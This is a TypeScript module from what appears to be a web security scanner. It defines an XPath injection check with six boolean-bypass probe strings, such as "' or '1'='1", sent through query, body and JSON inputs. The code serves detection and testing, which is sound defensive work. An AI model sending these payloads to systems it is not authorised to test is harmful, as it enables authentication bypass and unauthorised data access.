// XPath injection active check family.
import type { PayloadVariant } from '../types';

export const META = {
  id: 'xpath-injection',
  family: 'xpath-injection' as const,
  name: 'XPath Injection',
  description: 'Detects XPath injection via boolean-based and error-based probes.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['query', 'body', 'json'],
};

const XPATH_PROBES = [
  { value: "' or '1'='1", intent: 'Classic XPath OR bypass', signals: ['xpath-bypass'] },
  { value: "' or ''='", intent: 'Empty string comparison bypass', signals: ['xpath-bypass'] },
  { value: "x' or 'x'='x", intent: 'Always-true XPath condition', signals: ['xpath-bypass'] },
  { value: "') or ('x'='x", intent: 'Close parenthesis XPath bypass', signals: ['xpath-bypass'] },
  { value: "' or true() or '", intent: 'XPath true() function bypass', signals: ['xpath-bypass'] },
  { value: "1 or 1=1", intent: 'Numeric XPath OR bypass', signals: ['xpath-bypass'] },
];

export function variants(): PayloadVariant[] {
  return XPATH_PROBES.map((p, i) => ({ id: `xpath-${i+1}`, family: 'xpath-injection' as const, value: p.value, encoding: 'raw' as const, intent: p.intent, requiresOast: false, requiresBrowser: false, destructiveRisk: 'none' as const, expectedSignals: p.signals }));
}
